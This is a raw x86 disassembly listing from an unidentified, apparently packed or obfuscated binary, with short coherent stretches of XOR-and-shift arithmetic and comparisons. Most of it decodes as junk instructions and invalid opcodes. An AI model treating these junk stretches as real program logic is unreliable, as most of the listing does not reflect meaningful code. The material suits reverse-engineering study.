  409c26:	mov    eax,DWORD PTR [ebp-0x38]
  409c29:	mov    ecx,DWORD PTR [ebp-0x34]
  409c2c:	shrd   eax,ecx,0x2
  409c30:	shr    ecx,0x2
  409c33:	mov    ecx,DWORD PTR [ebp-0x38]
  409c36:	mov    edx,DWORD PTR [ebp-0x34]
  409c39:	xor    edx,edx
  409c3b:	xor    eax,edi
  409c3d:	or     eax,edx
  409c3f:	add    eax,DWORD PTR ds:0x422568
  409c45:	shl    ecx,0x1e
  409c48:	mov    ecx,DWORD PTR [ebp-0x38]
  409c4b:	mov    edx,DWORD PTR [ebp-0x34]
  409c4e:	shrd   ecx,edx,0x2
  409c52:	xor    ecx,edi
  409c54:	shr    edx,0x2
  409c57:	mov    edx,DWORD PTR [ebp-0x38]
  409c5a:	mov    edi,DWORD PTR [ebp-0x34]
  409c5d:	xor    edi,edi
  409c5f:	or     ecx,edi
  409c61:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  409c65:	or     BYTE PTR [eax],cl
  409c67:	shl    edx,0x1e
  409c6a:	mov    edx,DWORD PTR [ebx]
  409c6c:	mov    eax,DWORD PTR [ebx+0x4]
  409c6f:	mov    edi,DWORD PTR [ebx]
  409c71:	mov    ecx,DWORD PTR [ebx+0x4]
  409c74:	xor    edx,0xca79a577
  409c7a:	xor    eax,0x9c1b89e8
  409c7f:	shrd   edx,eax,0x2
  409c83:	xor    ecx,ecx
  409c85:	or     ecx,edx
  409c87:	mov    DWORD PTR [ebp+0x8],ecx
  409c8a:	mov    ecx,DWORD PTR [esi]
  409c8c:	mov    edx,DWORD PTR [esi+0x4]
  409c8f:	xor    edx,0x9c1b89e8
  409c95:	xor    ecx,0xca79a577
  409c9b:	mov    DWORD PTR [ebp+0x14],ecx
  409c9e:	mov    ecx,edx
  409ca0:	mov    edx,DWORD PTR [ebp+0x14]
  409ca3:	shrd   edx,ecx,0x2
  409ca7:	shr    eax,0x2
  409caa:	shl    edi,0x1e
  409cad:	mov    DWORD PTR [ebp-0x6c],eax
  409cb0:	mov    DWORD PTR [ebp-0x70],edx
  409cb3:	mov    edx,DWORD PTR [esi]
  409cb5:	mov    eax,0x40000000
  409cba:	xor    edi,eax
  409cbc:	or     edi,DWORD PTR [ebp-0x6c]
  409cbf:	mov    DWORD PTR [ebp+0x14],edx
  409cc2:	shl    DWORD PTR [ebp+0x14],0x1e
  409cc6:	xor    DWORD PTR [ebp+0x14],eax
  409cc9:	mov    DWORD PTR [ebp+0xc],edi
  409ccc:	jmp    0x40a0aa
  409cd1:	jbe    0x409d4e
  409cd3:	fstp   TBYTE PTR [edx+ebx*8-0x78e4c9e4]
  409cda:	ins    DWORD PTR es:[edi],dx
  409cdb:	cmp    DWORD PTR [ebp+ebp*2-0x73],0xffffffe5
  409ce0:	stos   BYTE PTR es:[edi],al
  409ce1:	int    0x39
  409ce3:	sbb    BYTE PTR [eax],bl
  409ce5:	sahf   
  409ce6:	adc    bl,BYTE PTR [eax]
  409ce8:	sbb    BYTE PTR [eax],dh
  409cea:	or     edi,DWORD PTR [ebx]
  409cec:	sub    ecx,ecx
  409cee:	jle    0x409d6a
  409cf0:	mov    ebp,es
  409cf2:	cmp    ah,BYTE PTR [edi+0x4]
  409cf5:	push   esp
  409cf6:	push   eax
  409cf7:	xor    BYTE PTR ds:0x28a7a6c4,dl
  409cfd:	jmp    0x59b5cde5
  409d02:	push   edi
  409d03:	and    esi,ebx
  409d05:	retf   0x20bb
  409d08:	sbb    eax,0xf4a3c219
  409d0d:	fdiv   DWORD PTR [ebp-0x41]
  409d10:	mov    ebx,0xa3ec9351
  409d15:	mov    ebx,0xa4127923
  409d1a:	jne    0x409d03
  409d1c:	lock mov ebp,0x943312a8
  409d22:	jmp    FWORD PTR [edi]
  409d24:	pushf  
  409d25:	fst    DWORD PTR [edx]
  409d27:	sbb    al,BYTE PTR [eax-0x6c]
  409d2a:	in     al,dx
  409d2b:	inc    esi
  409d2c:	dec    esp
  409d2d:	cwde   
  409d2e:	out    0x96,al
  409d30:	push   ds
  409d31:	data16 out dx,al
  409d33:	mov    dh,0xef
  409d35:	leave  
  409d36:	push   eax
  409d37:	push   ss
  409d38:	cmp    eax,edx
  409d3a:	push   ebx
  409d3b:	out    0x94,al
  409d3d:	mov    esp,edx
  409d3f:	pop    esi
  409d40:	or     al,0xee
  409d42:	enter  0x3cff,0xb3
  409d46:	fnstsw WORD PTR [ecx-0x5d]
  409d49:	cwde   
  409d4a:	call   0x385c:0x51c4b22d
  409d51:	mov    ds:0x539eba8b,eax
  409d56:	or     al,0x30
  409d58:	add    DWORD PTR [esi-0x7efac254],edx
  409d5e:	push   ebx
  409d5f:	adc    eax,0x540a270
  409d64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d65:	popf   
  409d66:	xchg   ebp,eax
  409d67:	sbb    DWORD PTR [ecx-0x2bceb837],esi
  409d6d:	icebp  
  409d6e:	iret   
  409d6f:	mov    eax,0xc634e28
  409d74:	cmp    DWORD PTR [eax],0x21dbcaf5
  409d7a:	daa    
  409d7b:	inc    DWORD PTR [ecx+0x43c79e1b]
  409d81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d82:	mov    ch,0x44
  409d84:	pushf  
  409d85:	rcl    DWORD PTR [edi+edx*1+0x13],0x8a
  409d8a:	jge    0x409de0
  409d8c:	cmp    ah,bl
  409d8e:	lea    ebp,[eax*8-0x16c1dbf8]
  409d95:	inc    esi
  409d96:	cdq    
  409d97:	mov    cl,0x4
  409d99:	and    al,bl
  409d9b:	jb     0x409df0
  409d9d:	xchg   ebp,eax
  409d9e:	xor    BYTE PTR [eax+0x78ff638],al
  409da4:	in     eax,0xbd
  409da6:	mov    cl,0x1
  409da8:	xor    dh,BYTE PTR [ecx+ecx*1]
  409dab:	inc    esi
  409dac:	push   esp
  409dad:	cld    
  409dae:	push   edi
  409daf:	ins    BYTE PTR es:[di],dx
  409db1:	pop    edi
  409db2:	inc    esp
  409db3:	sbb    ebx,DWORD PTR [ebp+0xa]
  409db6:	xchg   edx,eax
  409db7:	int3   
  409db8:	hlt    
  409db9:	mov    edx,0xf205b31b
  409dbe:	push   ecx
  409dbf:	dec    esp
  409dc0:	dec    ebp
  409dc1:	pop    esi
  409dc2:	fbstp  TBYTE PTR [ecx]
  409dc4:	cdq    
  409dc5:	test   DWORD PTR [edi-0x47031e5e],eax
  409dcb:	push   esp
  409dcc:	sub    BYTE PTR [edx*8+0x690e5990],bl
  409dd3:	or     DWORD PTR [edx+0x14],eax
  409dd6:	sbb    DWORD PTR [edx-0x56],eax
  409dd9:	ja     0x409d7c
  409ddb:	inc    edx
  409ddc:	cld    
  409ddd:	imul   edx,DWORD PTR [eax-0x2c],0x1c
  409de1:	je     0x409e57
  409de3:	stc    
  409de4:	mov    esp,edx
  409de6:	mov    ecx,eax
  409de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409de9:	jge    0x409e34
  409deb:	inc    ebx
  409dec:	popa   
  409ded:	fwait
  409dee:	jns    0x409d79
  409df0:	popa   
  409df1:	sti    
  409df2:	mov    ecx,0xac3ed685
  409df7:	pop    ds
  409df8:	popf   
  409df9:	push   ebp
  409dfa:	out    0xa6,eax
  409dfc:	xchg   edi,eax
  409dfd:	jl     0x409e69
  409dff:	test   al,0x52
  409e01:	loopne 0x409da6
  409e03:	or     ch,ch
  409e05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e06:	xchg   edi,eax
  409e07:	cli    
  409e08:	in     eax,0x2
  409e0a:	scas   al,BYTE PTR es:[edi]
  409e0b:	xchg   esp,eax
  409e0c:	cli    
  409e0d:	adc    dh,dl
  409e0f:	fld    TBYTE PTR [eax-0x70fc651d]
  409e15:	(bad)  
  409e16:	pop    ebp
  409e17:	add    bh,BYTE PTR [eax]
  409e19:	lods   al,BYTE PTR ds:[esi]
  409e1a:	mov    eax,0x386d9785
  409e1f:	mov    dl,0x52
  409e21:	call   DWORD PTR [ebp+esi*8+0x9]
  409e25:	xchg   esi,eax
  409e26:	mov    cl,0xf8
  409e28:	adc    ah,BYTE PTR [edi]
  409e2a:	sub    eax,0xf309b827
  409e2f:	xor    BYTE PTR [esi+edx*1],cl
  409e32:	pop    es
  409e33:	sbb    eax,DWORD PTR [esi-0x7641e5a2]
  409e39:	js     0x409e7c
  409e3b:	and    BYTE PTR [ecx*4-0x3cae520f],ch
  409e42:	fdiv   st(5),st
  409e44:	out    dx,al
  409e45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e46:	push   ds
  409e47:	or     ecx,DWORD PTR [ebx-0x47ed3572]
  409e4d:	nop
  409e4e:	inc    eax
  409e4f:	sub    esi,DWORD PTR [edi-0xd9d4aed]
  409e55:	and    dh,BYTE PTR [ecx-0x42]
  409e58:	stos   BYTE PTR es:[edi],al
  409e59:	mov    edx,0x71df1a8f
  409e5e:	scas   eax,DWORD PTR es:[edi]
  409e5f:	jmp    0x8b82:0xd9110b8c
  409e66:	mov    esp,0xa026f5e8
  409e6b:	add    eax,0xf5ba2339
  409e70:	or     BYTE PTR [edx+0x107bced0],ch
  409e76:	mov    ds:0xbee534bf,al
  409e7b:	es mov bl,0x5a
  409e7e:	mov    cl,0x7b
  409e80:	jge    0x409e77
  409e82:	outs   dx,BYTE PTR ds:[esi]
  409e83:	xor    eax,esp
  409e85:	lahf   
  409e86:	mov    ebp,0xf4307a67
  409e8b:	jecxz  0x409e84
  409e8d:	sbb    edx,DWORD PTR [ecx-0x16]
  409e90:	lea    esp,[ebp-0x26]
  409e93:	or     BYTE PTR [ecx],dh
  409e95:	mov    eax,ds:0x2fc98006
  409e9a:	ja     0x409e26
  409e9c:	idiv   ebp
  409e9e:	or     esp,DWORD PTR [eax-0x40]
  409ea1:	lds    ebp,FWORD PTR ds:0x93d45171
  409ea7:	pusha  
  409ea8:	jno    0x409ec9
  409eaa:	loopne 0x409ea9
  409eac:	fisubr WORD PTR [ebp-0x2743f113]
  409eb2:	mov    eax,0x4653a212
  409eb7:	inc    ecx
  409eb8:	pop    ds
  409eb9:	daa    
  409eba:	or     ecx,esp
  409ebc:	push   es
  409ebd:	and    eax,0x236b7c59
  409ec2:	sub    bh,cl
  409ec4:	aam    0x71
  409ec6:	mov    al,ds:0xf18d90e9
  409ecb:	dec    esi
  409ecc:	inc    ebp
  409ecd:	xchg   esp,eax
  409ece:	jb     0x409efb
  409ed0:	mov    bl,0x17
  409ed2:	retf   
  409ed3:	int    0x39
  409ed5:	xchg   ecx,eax
  409ed6:	mov    BYTE PTR [eax-0x6bd6586],ch
  409edc:	sbb    eax,0x303bc231
  409ee1:	inc    esp
  409ee2:	fwait
  409ee3:	(bad)  
  409ee4:	jmp    0xf79e825e
  409ee9:	nop
  409eea:	mov    al,0xf2
  409eec:	pop    ebx
  409eed:	mov    edx,0x20a78e90
  409ef2:	jl     0x409e8a
  409ef4:	and    al,0x38
  409ef6:	add    edi,ecx
  409ef8:	sbb    eax,0xb572f5ca
  409efd:	int3   
  409efe:	stc    
  409eff:	sub    al,0xf6
  409f01:	(bad)  
  409f02:	int    0xd6
  409f04:	(bad)  
  409f05:	stos   BYTE PTR es:[edi],al
  409f06:	cmp    bl,cl
  409f08:	ret    
  409f09:	cmp    eax,0x60963cb5
  409f0e:	(bad)  [ebx+0x524bc201]
  409f14:	ret    
  409f15:	in     eax,dx
  409f16:	xchg   esp,eax
  409f17:	retf   
  409f18:	mov    ds:0xc1a6c1b6,al
  409f1d:	hlt    
  409f1e:	jl     0x409f5a
  409f20:	pop    bp
  409f22:	add    al,0x9
  409f24:	jb     0x409ee8
  409f26:	sub    BYTE PTR [ebx+0x31ac17d6],0x0
  409f2d:	cmp    cl,dl
  409f2f:	loopne 0x409f09
  409f31:	aaa    
  409f32:	ins    DWORD PTR es:[edi],dx
  409f33:	arpl   sp,cx
  409f35:	dec    BYTE PTR [esi]
  409f37:	sub    al,0x4a
  409f39:	cmp    eax,0xcb0923bb
  409f3e:	push   ebp
  409f3f:	mov    esi,0x1490a1f4
  409f44:	sbb    al,0x9a
  409f46:	sbb    ebx,0x4bd8c271
  409f4c:	pop    ds
  409f4d:	pop    ds
  409f4e:	arpl   bx,cx
  409f50:	inc    edx
  409f51:	js     0x409fa2
  409f53:	and    al,0xab
  409f55:	xor    ebx,DWORD PTR [ebx-0x2cac635d]
  409f5b:	dec    esi
  409f5c:	fwait
  409f5d:	call   0x5f69:0x1f9e215c
  409f64:	mov    DWORD PTR [eax-0x1f5aab2e],ebp
  409f6a:	cmp    BYTE PTR [ebx-0x77],0xe2
  409f6e:	jne    0x409f55
  409f70:	and    dl,BYTE PTR [edx]
  409f72:	push   ecx
  409f73:	stc    
  409f74:	lea    eax,[edi+0x7affc4f8]
  409f7a:	jnp    0x409efd
  409f7c:	inc    ebp
  409f7d:	into   
  409f7e:	cmp    eax,DWORD PTR [ebp+0x1d8a17cd]
  409f84:	ss jb  0x409f1c
  409f87:	xchg   DWORD PTR [ebx-0x3],edx
  409f8a:	add    DWORD PTR [esp+edx*8+0x5e9cb996],esi
  409f91:	sahf   
  409f92:	jno    0x409f4a
  409f94:	nop
  409f95:	sahf   
  409f96:	cmp    dl,dh
  409f98:	lahf   
  409f99:	in     eax,dx
  409f9a:	mov    dl,0xf7
  409f9c:	cmp    BYTE PTR [esi],dh
  409f9e:	iret   
  409f9f:	jge    0x409f55
  409fa1:	dec    esi
  409fa2:	adc    DWORD PTR [eax+0x2],ecx
  409fa5:	iret   
  409fa6:	push   ebp
  409fa7:	ror    edx,0xcd
  409faa:	js     0x409f8b
  409fac:	xlat   BYTE PTR ds:[ebx]
  409fad:	pop    ss
  409fae:	pop    DWORD PTR [edi]
  409fb0:	inc    eax
  409fb1:	mov    dl,0x99
  409fb3:	rcl    esp,0xb9
  409fb6:	mov    edi,0x372ff0a0
  409fbb:	push   0x38
  409fbd:	or     ecx,DWORD PTR [edx]
  409fbf:	call   0xfc8b8a23
  409fc4:	test   eax,0x7e9eb1fc
  409fc9:	push   esp
  409fca:	pop    ebx
  409fcb:	push   es
  409fcc:	fmul   QWORD PTR [esi+0xc]
  409fcf:	out    dx,al
  409fd0:	jge    0x409fba
  409fd2:	sub    al,0x3c
  409fd4:	(bad)  
  409fd5:	outs   dx,DWORD PTR ds:[esi]
  409fd6:	data16 add BYTE PTR [edx+ebp*2],ch
  409fda:	mov    ds:0xee4a2a0e,al
  409fdf:	retf   
  409fe0:	jb     0x409fb9
  409fe2:	aam    0x91
  409fe4:	out    dx,al
  409fe5:	enter  0xecb7,0xe1
  409fe9:	push   ecx
  409fea:	je     0x40a032
  409fec:	jl     0x409ffe
  409fee:	outs   dx,DWORD PTR ds:[esi]
  409fef:	mov    dl,0x50
  409ff1:	sub    DWORD PTR [ecx],esi
  409ff3:	dec    eax
  409ff4:	xchg   esp,eax
  409ff5:	es jne 0x409fee
  409ff8:	test   DWORD PTR [edx+eax*2],edx
  409ffb:	ss or  esi,ebp
  409ffe:	mov    edi,DWORD PTR [esi+0x29]
  40a001:	pop    ecx
  40a002:	xchg   esp,eax
  40a003:	xlat   BYTE PTR ds:[ebx]
  40a004:	mov    bh,0x76
  40a006:	iret   
  40a007:	in     al,0x18
  40a009:	pushf  
  40a00a:	dec    edi
  40a00b:	mov    cl,ah
  40a00d:	or     esi,edx
  40a00f:	pop    ebp
  40a010:	jp     0x409fa4
  40a012:	jmp    0xc2ebc212
  40a017:	jbe    0x40a03a
  40a019:	fst    DWORD PTR [eax]
  40a01b:	in     al,dx
  40a01c:	mov    ds:0x768193db,al
  40a021:	shr    DWORD PTR [eax-0x358a0926],cl
  40a027:	sti    
  40a028:	out    dx,eax
  40a029:	push   0xe9aac7f5
  40a02e:	jmp    0x40a008
  40a030:	mov    esp,0x49acf37d
  40a035:	pop    ds
  40a036:	xchg   esi,eax
  40a037:	dec    eax
  40a038:	mov    ecx,0x9172070e
  40a03d:	jne    0x40a06c
  40a03f:	mov    DWORD PTR ds:0xceb2a29e,edx
  40a045:	fldcw  WORD PTR [ebx]
  40a047:	mov    ch,0x51
  40a049:	xchg   edi,eax
  40a04a:	jmp    0xb39f:0xfd714e03
  40a051:	or     BYTE PTR [ebp+0x2a47ea51],0xf
  40a058:	fst    DWORD PTR [ebp-0x78]
  40a05b:	add    DWORD PTR [ebx-0x7d],0xfffffffd
  40a05f:	(bad)  
  40a060:	mov    eax,0x317936b5
  40a065:	or     al,0xe
  40a067:	adc    edx,DWORD PTR [ebx]
  40a069:	dec    esi
  40a06a:	test   BYTE PTR [ebx-0x55],al
  40a06d:	pop    ds
  40a06e:	cld    
  40a06f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a070:	mov    esp,0x4f3e18ae
  40a075:	mov    dl,0x4c
  40a077:	cmc    
  40a078:	pop    eax
  40a079:	rcl    DWORD PTR [esi-0x3d],0x88
  40a07d:	push   eax
  40a07e:	fisttp WORD PTR [edx]
  40a080:	ret    
  40a081:	and    DWORD PTR [edi],ecx
  40a083:	push   ebp
  40a084:	mov    al,0xf0
  40a086:	xlat   BYTE PTR ds:[ebx]
  40a087:	and    BYTE PTR [ecx+0x19],bh
  40a08a:	jnp    0x40a0e6
  40a08c:	pop    esp
  40a08d:	out    0xd9,al
  40a08f:	push   edi
  40a090:	cmp    al,0x55
  40a092:	xor    BYTE PTR [ecx-0xd],dh
  40a095:	mov    WORD PTR [eax+0x7],fs
  40a098:	(bad)  
  40a099:	loopne 0x40a0c9
  40a09b:	push   ebp
  40a09c:	sub    BYTE PTR es:[edx-0xcfcf000],ah
  40a0a3:	and    BYTE PTR [esi],0x91
  40a0a6:	add    DWORD PTR [edi],edi
  40a0a8:	lock mov edi,0x8b047e8b
  40a0ae:	jge    0x40a0c4
  40a0b0:	xor    edx,edx
  40a0b2:	or     edx,DWORD PTR [ebp-0x70]
  40a0b5:	shr    ecx,0x2
  40a0b8:	or     edi,ecx
  40a0ba:	cmp    edx,DWORD PTR [ebp+0x8]
  40a0bd:	jne    0x40a9b0
  40a0c3:	cmp    edi,DWORD PTR [ebp+0xc]
  40a0c6:	jne    0x40a9b0
  40a0cc:	jmp    0x40a926
  40a0d1:	mov    eax,DWORD PTR [esi]
  40a0d3:	mov    edx,DWORD PTR [esi+0x4]
  40a0d6:	mov    eax,DWORD PTR [esi]
  40a0d8:	mov    edx,DWORD PTR [esi+0x4]
  40a0db:	xor    eax,0xca79a577
  40a0e0:	xor    edx,ecx
  40a0e2:	mov    ecx,eax
  40a0e4:	mov    eax,edx
  40a0e6:	shrd   ecx,eax,0x2
  40a0ea:	shr    eax,0x2
  40a0ed:	mov    DWORD PTR [ebp+0xc],eax
  40a0f0:	mov    eax,DWORD PTR [esi]
  40a0f2:	mov    edx,DWORD PTR [esi+0x4]
  40a0f5:	mov    edx,eax
  40a0f7:	xor    eax,eax
  40a0f9:	or     eax,ecx
  40a0fb:	mov    ecx,DWORD PTR [ebx]
  40a0fd:	shl    edx,0x1e
  40a100:	xor    edx,0x40000000
  40a106:	mov    DWORD PTR [ebp+0x10],eax
  40a109:	mov    eax,edx
  40a10b:	or     eax,DWORD PTR [ebp+0xc]
  40a10e:	mov    edx,DWORD PTR [ebx+0x4]
  40a111:	push   eax
  40a112:	push   DWORD PTR [ebp+0x10]
  40a115:	push   edx
  40a116:	push   ecx
  40a117:	jmp    0x40a4f5
  40a11c:	std    
  40a11d:	dec    ecx
  40a11e:	mov    ah,0xd2
  40a120:	sub    al,0x22
  40a122:	fidivr DWORD PTR [edi]
  40a124:	test   al,0x29
  40a126:	push   ebp
  40a127:	stos   BYTE PTR es:[edi],al
  40a128:	xchg   ebp,eax
  40a129:	push   eax
  40a12a:	pop    ds
  40a12b:	jle    0x40a17f
  40a12d:	xor    ebx,DWORD PTR [eax]
  40a12f:	sbb    BYTE PTR [esi-0x31e7e7ee],bl
  40a135:	cli    
  40a136:	test   DWORD PTR ss:[eax-0xe9df11c],0x3625a3a5
  40a141:	test   BYTE PTR ds:0x5e9cabe7,bh
  40a147:	fldenv [ecx+0x1e]
  40a14a:	(bad)  
  40a14b:	push   ebx
  40a14c:	das    
  40a14d:	aaa    
  40a14e:	or     eax,0x3e28d14a
  40a153:	in     al,0xa0
  40a155:	cdq    
  40a156:	push   0xffffffd0
  40a158:	stos   DWORD PTR es:[edi],eax
  40a159:	out    dx,al
  40a15a:	(bad)  
  40a15b:	push   ss
  40a15c:	in     al,0xa7
  40a15e:	dec    esi
  40a15f:	jp     0x40a1bf
  40a161:	push   0x52082a78
  40a166:	adc    al,BYTE PTR [ecx-0x64576410]
  40a16c:	inc    edx
  40a16d:	push   0xffffffec
  40a16f:	xchg   eax,ebp
  40a171:	xchg   BYTE PTR [edx+0x6c824caa],bh
  40a177:	pop    edi
  40a178:	push   0x8b3aa1b1
  40a17d:	mov    eax,edi
  40a17f:	loope  0x40a1ff
  40a181:	push   esp
  40a182:	or     ch,BYTE PTR [ebx]
  40a184:	and    ecx,edx
  40a186:	fild   QWORD PTR [eax+0x76965498]
  40a18c:	ror    DWORD PTR [esi+0x6a0789d8],0xbd
  40a193:	sub    esi,DWORD PTR [ebp+0x681caaec]
  40a199:	in     al,0xbf
  40a19b:	mov    cl,0xfc
  40a19d:	xor    eax,0x6cce76e8
  40a1a2:	pop    ecx
  40a1a3:	jl     0x40a1dd
  40a1a5:	mov    bh,0x60
  40a1a7:	cmp    DWORD PTR [eax-0x440ff473],ebx
  40a1ad:	mov    ebx,0x53362209
  40a1b2:	pushf  
  40a1b3:	push   ss
  40a1b4:	(bad)  
  40a1b5:	in     al,dx
  40a1b6:	xchg   cx,ax
  40a1b8:	aas    
  40a1b9:	in     eax,0xc5
  40a1bb:	mov    ch,0xfe
  40a1bd:	add    ebp,DWORD PTR [ecx+0x64df9f52]
  40a1c3:	rep stos BYTE PTR es:[edi],al
  40a1c5:	rcr    edx,cl
  40a1c7:	jmp    0x40a21f
  40a1c9:	xchg   ecx,eax
  40a1ca:	out    dx,eax
  40a1cb:	xchg   BYTE PTR [esi-0x4],ch
  40a1ce:	mov    edi,DWORD PTR [eax+0x31e9114d]
  40a1d4:	in     al,0x51
  40a1d6:	fld    DWORD PTR ds:0x8cf33d2b
  40a1dc:	ins    BYTE PTR es:[edi],dx
  40a1dd:	retf   0x94d4
  40a1e0:	(bad)  
  40a1e1:	loope  0x40a222
  40a1e3:	xchg   DWORD PTR [edx-0x7b6300e5],esi
  40a1e9:	jle    0x40a1e0
  40a1eb:	inc    edi
  40a1ec:	sbb    al,0x6a
  40a1ee:	sbb    dh,al
  40a1f0:	dec    eax
  40a1f1:	jl     0x40a1d7
  40a1f3:	mov    bh,0x49
  40a1f5:	add    edi,edi
  40a1f7:	or     bl,BYTE PTR [edi+0x19]
  40a1fa:	dec    ecx
  40a1fb:	mov    ebx,0x11551922
  40a200:	scas   eax,DWORD PTR es:[edi]
  40a201:	shr    al,cl
  40a203:	and    al,0xe4
  40a205:	scas   eax,DWORD PTR es:[edi]
  40a206:	jns    0x40a27d
  40a208:	daa    
  40a209:	repnz mov cl,0xe7
  40a20c:	loop   0x40a1eb
  40a20e:	mov    al,0x98
  40a210:	in     eax,0x12
  40a212:	loop   0x40a1da
  40a214:	add    eax,0xe13229b7
  40a219:	nop
  40a21a:	jmp    eax
  40a21c:	add    BYTE PTR [edx],bl
  40a21e:	scas   al,BYTE PTR es:[edi]
  40a21f:	neg    DWORD PTR [edx+0x40]
  40a222:	fadd   st,st(0)
  40a224:	pop    eax
  40a225:	mov    ah,0xbc
  40a227:	pop    ebp
  40a228:	cmp    esp,esi
  40a22a:	inc    esp
  40a22b:	in     eax,dx
  40a22c:	xrelease xchg DWORD PTR [di],ebp
  40a230:	pop    eax
  40a231:	cwde   
  40a232:	push   DWORD PTR [ebx+0x49af7d0f]
  40a238:	push   ecx
  40a239:	jno    0x40a232
  40a23b:	aaa    
  40a23c:	mov    ah,ah
  40a23e:	mov    bh,0xd7
  40a240:	dec    ebx
  40a241:	retf   0xeed9
  40a244:	xchg   ecx,eax
  40a245:	fwait
  40a246:	addr16 or ebx,ebx
  40a249:	add    DWORD PTR [eax],0x1f
  40a24c:	cmp    ch,BYTE PTR [ebp-0x7ff85277]
  40a252:	std    
  40a253:	jb     0x40a2d4
  40a255:	jns    0x40a29e
  40a257:	jmp    0x40a28e
  40a259:	push   ss
  40a25a:	xchg   ah,bl
  40a25c:	xor    DWORD PTR [eax],esp
  40a25e:	inc    eax
  40a25f:	into   
  40a260:	mov    edx,0xca9e43f3
  40a265:	popa   
  40a266:	ja     0x40a1e8
  40a268:	xchg   DWORD PTR [ebp+0x1289f0c9],eax
  40a26e:	hlt    
  40a26f:	inc    edx
  40a270:	jno    0x40a2bc
  40a272:	pushf  
  40a273:	jecxz  0x40a258
  40a275:	mov    ebp,0xb4b81292
  40a27a:	mov    ecx,0x249880a0
  40a27f:	fsub   DWORD PTR [ebp-0x43]
  40a282:	push   cs
  40a283:	push   eax
  40a284:	scas   al,BYTE PTR es:[edi]
  40a285:	mov    WORD PTR [ebp-0x42],ds
  40a288:	xchg   ebx,eax
  40a289:	push   0x17
  40a28b:	pop    edi
  40a28c:	push   0x61
  40a28e:	imul   esp,DWORD PTR [ecx+0x5e5391b6],0x7cece208
  40a298:	sbb    eax,0x8b3e9646
  40a29d:	xchg   ecx,eax
  40a29e:	jge    0x40a237
  40a2a0:	mov    ch,0xb7
  40a2a2:	loope  0x40a303
  40a2a4:	inc    edx
  40a2a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2a6:	fisubr WORD PTR [edi+0x70]
  40a2a9:	cwde   
  40a2aa:	mov    dh,0x99
  40a2ac:	fs mov edx,0xffe5afd8
  40a2b2:	sub    al,0x55
  40a2b4:	ins    DWORD PTR es:[edi],dx
  40a2b5:	sub    al,0xa2
  40a2b7:	xchg   cx,ax
  40a2b9:	ins    BYTE PTR es:[edi],dx
  40a2ba:	mul    dl
  40a2bc:	loop   0x40a33b
  40a2be:	ret    0x68e7
  40a2c1:	and    eax,0x90fbd404
  40a2c6:	xchg   esp,eax
  40a2c7:	push   edi
  40a2c8:	push   esp
  40a2c9:	cmp    al,0x59
  40a2cb:	stc    
  40a2cc:	mov    ch,0x81
  40a2ce:	pop    es
  40a2cf:	cmc    
  40a2d0:	jp     0x40a343
  40a2d2:	popf   
  40a2d3:	imul   esp,DWORD PTR [edx+0x38baee6e],0xf8e51e81
  40a2dd:	clc    
  40a2de:	mov    ds:0xa5f66b8c,eax
  40a2e3:	je     0x40a31b
  40a2e5:	pop    eax
  40a2e6:	gs jnp 0x40a2f1
  40a2e9:	lea    eax,[edi+0x5e3d28e6]
  40a2ef:	sbb    edi,edi
  40a2f1:	push   ebx
  40a2f2:	cs icebp 
  40a2f4:	mov    BYTE PTR [esi-0x40713054],dh
  40a2fa:	aas    
  40a2fb:	popa   
  40a2fc:	xlat   BYTE PTR ds:[ebx]
  40a2fd:	mov    esp,0x1cec9dbe
  40a302:	jnp    0x40a363
  40a304:	xlat   BYTE PTR ds:[ebx]
  40a305:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a306:	xchg   esi,eax
  40a307:	repz add eax,DWORD PTR [esi-0x33]
  40a30b:	mov    ds:0xa27d365d,al
  40a310:	int    0xf9
  40a312:	add    al,0xb2
  40a314:	adc    eax,DWORD PTR [ebp+eiz*8+0x5a]
  40a318:	adc    al,0x5
  40a31a:	call   ecx
  40a31c:	rol    ah,0x44
  40a31f:	(bad)  
  40a320:	imul   ecx,DWORD PTR fs:[edx+0x1f61590f],0x9e5214dd
  40a32b:	push   ss
  40a32c:	out    0x5e,al
  40a32e:	in     eax,dx
  40a32f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a330:	test   al,0x62
  40a332:	aad    0xc0
  40a334:	xchg   ecx,ecx
  40a336:	cmc    
  40a337:	out    dx,eax
  40a338:	and    al,0xa1
  40a33a:	(bad)  
  40a33b:	repnz dec ecx
  40a33d:	pop    ebp
  40a33e:	fcomp  DWORD PTR [edx+0x38358cfd]
  40a344:	test   eax,0xa355482
  40a349:	inc    edi
  40a34a:	inc    ebp
  40a34b:	sbb    eax,0x33b36475
  40a350:	mov    dh,0x53
  40a352:	xchg   ebp,eax
  40a353:	cmp    eax,0x77505609
  40a358:	aaa    
  40a359:	push   ds
  40a35a:	cmp    dh,BYTE PTR [ebp+0x45]
  40a35d:	mov    bh,0x5e
  40a35f:	mov    ch,0xdf
  40a361:	pop    eax
  40a362:	mov    dl,0x30
  40a364:	(bad)  
  40a366:	cdq    
  40a367:	sbb    al,0x3a
  40a369:	(bad)  
  40a36a:	mov    eax,0x8bf3983d
  40a36f:	popa   
  40a370:	fwait
  40a371:	popf   
  40a372:	fistp  DWORD PTR [edx+0x79667c6f]
  40a378:	push   ecx
  40a379:	int    0xe6
  40a37b:	dec    edi
  40a37c:	pop    eax
  40a37d:	test   eax,0x9d506133
  40a382:	mov    DWORD PTR [ebx+ebp*2],eax
  40a385:	mul    BYTE PTR [esi+0x69d86808]
  40a38b:	js     0x40a344
  40a38d:	dec    eax
  40a38e:	inc    esi
  40a38f:	popa   
  40a390:	mov    bh,0xf6
  40a392:	push   ebp
  40a393:	repz adc ebx,DWORD PTR ds:0x5d391297
  40a39a:	add    bh,BYTE PTR [edi-0x3f2343e9]
  40a3a0:	dec    ebx
  40a3a1:	jg     0x40a3f0
  40a3a3:	mov    esi,0x88bf5913
  40a3a8:	push   ebx
  40a3a9:	jbe    0x40a3e6
  40a3ab:	out    dx,al
  40a3ac:	push   cs
  40a3ad:	test   DWORD PTR [ecx-0x2974835a],ebp
  40a3b3:	bound  eax,QWORD PTR [ebx]
